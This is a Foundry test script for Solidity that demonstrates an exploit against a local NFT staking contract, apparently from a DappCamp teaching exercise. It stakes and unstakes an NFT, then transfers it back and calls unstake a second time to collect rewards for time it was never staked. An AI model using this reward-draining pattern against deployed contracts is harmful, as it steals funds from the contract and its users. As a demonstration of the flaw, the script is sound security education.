// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Camp.sol";
import "../src/DappCampWarriors.sol";
import "../src/Staking.sol";

contract ExploitScript is Script {
    address immutable attacker = address(0xABDC);

    Camp camp;
    DappCampWarriors dappCampWarriors;
    Staking staking;

    function setUp() public {
        camp = new Camp();
        dappCampWarriors = new DappCampWarriors();
        staking = new Staking(address(camp), address(dappCampWarriors));

        camp.transferOwnership(address(staking));
        dappCampWarriors.mint(attacker);
    }

    function run() public {
        exploit();
    }

    function exploit() public {
        uint256 tokenId = 10;

        uint256 initialBalance = camp.balanceOf(attacker);

        vm.prank(attacker);
        dappCampWarriors.approve(address(staking), tokenId);

        // Stake NFT for rewards
        vm.prank(attacker);
        staking.stake(tokenId);

        // Moving timestamp by 100 seconds
        vm.warp(block.timestamp + 100);
        vm.prank(attacker);
        staking.unstake(tokenId);

        // Awards that the user deserved because the NFT was staked for 100s
        uint256 deservedRewards = camp.balanceOf(attacker) - initialBalance;

        console.log("Deserved Rewards: %d", deservedRewards);

        // Moving timestamp by 1000s. The NFT was not staked in the contract for these 1000 seconds
        vm.warp(block.timestamp + 1000);
        
        // Transfer NFT back to contract so that the unstake function can execute successfully
        vm.prank(attacker);
        dappCampWarriors.transferFrom(attacker, address(staking), tokenId);
        
        // Call unstake again
        vm.prank(attacker);
        staking.unstake(tokenId);

        // Extra rewards the user gained without staking the NFT for that period
        uint256 extraRewards = camp.balanceOf(attacker) - deservedRewards - initialBalance;

        console.log("Extra rewards gained through exploit: %d", extraRewards);
    }
}